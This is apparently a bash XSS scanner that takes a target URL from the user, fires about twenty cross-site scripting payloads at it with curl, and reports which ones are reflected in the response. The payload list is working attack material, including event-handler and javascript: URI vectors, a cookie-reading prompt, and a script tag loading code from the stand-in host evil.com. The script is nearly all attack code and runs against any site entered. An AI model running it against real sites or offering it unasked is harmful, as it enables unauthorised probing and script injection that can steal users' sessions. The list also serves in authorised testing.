#!/bin/bash

read -p "🎯 Enter target URL (e.g. https://example.com/search?q=): " URL

# 💣 لیست پیشرفته پیلودهای XSS
XSS_PAYLOADS=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "\"><svg/onload=alert('XSS')>"
    "';alert(String.fromCharCode(88,83,83))//"
    "<body onload=alert('XSS')>"
    "<iframe src=javascript:alert('XSS')></iframe>"
    "<video><source onerror=\"javascript:alert('XSS')\">"
    "<math><mtext></mtext><script>alert('XSS')</script></math>"
    "<object data='javascript:alert(`XSS`)'></object>"
    "<a href=\"javas&#99;ript:alert('XSS')\">Click</a>"
    "<details open ontoggle=alert('XSS')>X</details>"
    "<img src=x onerror=confirm(1)>"
    "<svg><desc><![CDATA[</desc><script>alert('XSS')</script>]]></svg>"
    "<style>@import'javascript:alert(1)';</style>"
    "<img src=1 onerror=prompt(document.cookie)>"
    "<marquee onstart=alert('XSS')>X</marquee>"
    "<input autofocus onfocus=alert(1)>"
    "'\"><img src=x onerror=alert('XSS')>//"
    "<script src='https://evil.com/xss.js'></script>"
    "<link rel=stylesheet href='javascript:alert(1)'>"
    "</title><script>alert('XSS')</script><!--"
)

echo "🚀 Starting XSS tests on: $URL"

for payload in "${XSS_PAYLOADS[@]}"; do
    ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
    FULL_URL="${URL}${ENCODED}"

    echo -e "\n⚡ Testing payload:\n$payload"
    RESPONSE=$(curl -sk "$FULL_URL")

    if echo "$RESPONSE" | grep -q "$payload"; then
        echo "🛑 Potential XSS reflected!"
    else
        echo "✅ Not reflected."
    fi
done

